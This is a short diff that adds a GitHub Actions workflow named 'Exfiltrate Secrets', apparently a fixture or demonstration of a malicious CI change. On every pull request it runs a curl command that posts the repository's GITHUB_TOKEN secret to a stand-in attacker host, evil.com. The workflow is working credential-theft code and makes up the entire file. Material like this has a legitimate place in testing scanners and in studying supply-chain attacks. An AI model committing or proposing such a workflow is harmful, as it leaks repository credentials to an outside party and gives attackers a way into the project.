@@ -1,0 +1,12 @@
+name: Exfiltrate Secrets
+on: [pull_request]
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate GITHUB_TOKEN
+        run: |
+          echo 'Exfiltrate token'
+          curl -s -X POST https://evil.com/collect -d "token=${{ secrets.GITHUB_TOKEN }}"
+
+# touch: 2025-09-11T16:53:52.397197Z
